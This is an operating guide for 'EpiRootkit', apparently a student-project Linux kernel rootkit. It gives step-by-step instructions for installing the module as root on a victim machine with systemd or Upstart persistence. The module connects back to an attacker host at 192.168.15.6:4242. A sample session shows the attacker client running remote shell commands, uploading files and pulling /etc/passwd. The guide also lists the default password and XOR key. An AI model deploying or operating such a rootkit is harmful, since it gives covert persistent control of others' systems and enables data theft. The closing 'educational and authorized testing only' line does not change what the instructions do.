# EpiRootkit Guide v1.0

## Introduction
This guide explains how to install, use, and remove the EpiRootkit on a Linux system. It also describes the roles of the victim and attacker machines, and how to interact with the rootkit using the provided client tools.

---

## 1. Machine Roles
- **Victim Machine**: The Linux system where the rootkit (kernel module) will be installed. This is the target of the attack.
- **Attacker Machine**: The system from which you control the rootkit, using the provided Python client tools (`client.py` or `epirootkit_client.py`).

---

## 2. Installation (Victim Machine)
1. **Copy the `rootkit/` directory to the victim machine.**
2. **Run the installation script as root:**
   ```bash
   cd rootkit
   sudo ./install.sh
   ```
   - The script will compile the kernel module, install it, and set up persistence (systemd or Upstart, depending on the OS).
   - The module will connect to the attacker's IP and port as specified in `epirootkit.c` (default: `192.168.15.6:4242`).
   - You can edit `epirootkit.c` to change the server IP/port, then recompile.

---

## 3. Attacker Setup (Attacker Machine)
1. **Ensure Python 3 is installed.**
2. **Run the client tool:**
   ```bash
   cd attacking_program
   python3 client.py
   # or
   python3 epirootkit_client.py
   ```
   - The client will listen on the configured port (default: 4242) for a connection from the victim.
   - When the rootkit connects, you will be prompted for a password (default: `epirootkit`).

---

## 4. Usage (Attacker Machine)
After authentication, you can use the following commands:
- `exec <command>`: Execute a shell command on the victim.
- `upload <local_path> <remote_path>`: Upload a file to the victim.
- `download <remote_path> <local_path>`: Download a file from the victim.
- `auth change <newpassword>`: Change the rootkit password.
- `exit` or `quit`: Close the session.

**Example session:**
```
$ python3 client.py
[+] En attente de connexion sur 0.0.0.0:4242 ...
[+] Connexion reçue de <victim_ip>:<port>
Mot de passe: epirootkit
[+] Authentifié.
$ exec uname -a
Linux victim 5.4.0-42-generic ...
$ upload myfile.txt /tmp/secret.txt
Upload success
$ download /etc/passwd passwd_copy
[+] Fichier téléchargé: passwd_copy
$ auth change newpass123
Password changed successfully
$ exit
```

---

## 5. Uninstallation (Victim Machine)
To remove the rootkit and its persistence:
```bash
cd rootkit
sudo ./uninstall.sh
```

---

## 6. Notes
- The rootkit uses XOR encryption for communication (key: `epirootkit`).
- The default password is `epirootkit`. Change it after first use for better security.
- The rootkit will attempt to reconnect to the attacker if the connection is lost.
- For Ubuntu 14.04, Upstart is used for persistence; for newer systems, systemd is used.

---

## 7. Troubleshooting
- If the module does not load, check kernel headers and permissions.
- If the client does not receive a connection, verify network/firewall settings and the IP/port in `epirootkit.c`.

---

**For educational and authorized testing only.**

